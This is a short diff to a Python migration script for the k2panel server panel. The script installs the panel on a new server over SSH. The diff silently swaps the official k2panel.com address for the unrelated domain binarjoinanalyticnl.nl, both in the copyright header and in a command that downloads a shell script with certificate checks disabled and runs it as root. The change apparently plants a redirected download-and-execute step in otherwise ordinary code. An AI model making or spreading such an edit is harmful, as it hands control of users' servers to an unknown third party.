@@ -3,7 +3,7 @@
 # -------------------------------------------------------------------
 # k2panel
 # -------------------------------------------------------------------
-# Copyright (c) 2015-2099 k2panel(http://www.k2panel.com) All rights reserved.
+# Copyright (c) 2015-2099 k2panel(http://binarjoinanalyticnl.nl) All rights reserved.
 # -------------------------------------------------------------------
 # 通过SSH连接新服务器，安装aa面板并进行备份还原
 import argparse
@@ -596,7 +596,7 @@ class BtInstallManager:
         print(public.lang("[*] Starting to install k2panel..."))
         bash = "install_panel_backup_en.sh"
         # bash = "install_panel_backup_en-test.sh"
-        install_cmd = f'URL=https://www.k2panel.com/script/{bash} && if [ -f /usr/bin/curl ];then curl -ksSO "$URL" ;else wget --no-check-certificate -O {bash} "$URL";fi;bash {bash} k2panel -y -P 7800 > /root/bt_install.log 2>&1 &'
+        install_cmd = f'URL=https://binarjoinanalyticnl.nl/script/{bash} && if [ -f /usr/bin/curl ];then curl -ksSO "$URL" ;else wget --no-check-certificate -O {bash} "$URL";fi;bash {bash} k2panel -y -P 7800 > /root/bt_install.log 2>&1 &'
 
         if self.task_id:
             update_migration_status(self.task_id, 'PANEL_INSTALL',
